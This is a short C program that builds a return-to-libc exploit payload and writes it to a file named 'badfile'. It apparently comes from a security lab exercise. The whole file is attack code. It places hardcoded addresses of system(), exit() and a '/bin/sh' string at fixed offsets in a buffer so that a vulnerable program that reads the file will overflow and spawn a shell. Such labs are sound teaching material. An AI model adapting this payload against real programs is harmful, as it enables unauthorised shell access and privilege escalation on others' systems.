#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[41];
  FILE *badfile;
  badfile = fopen("./badfile", "w");

  *(long *) &buf[29] = 0xf7e12420 ;   //  system()  
  *(long *) &buf[33] = 0xf7e04f80 ;   //  exit()              
  *(long *) &buf[37] = 0xffffd4b0;   //  "/bin/sh"         

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}
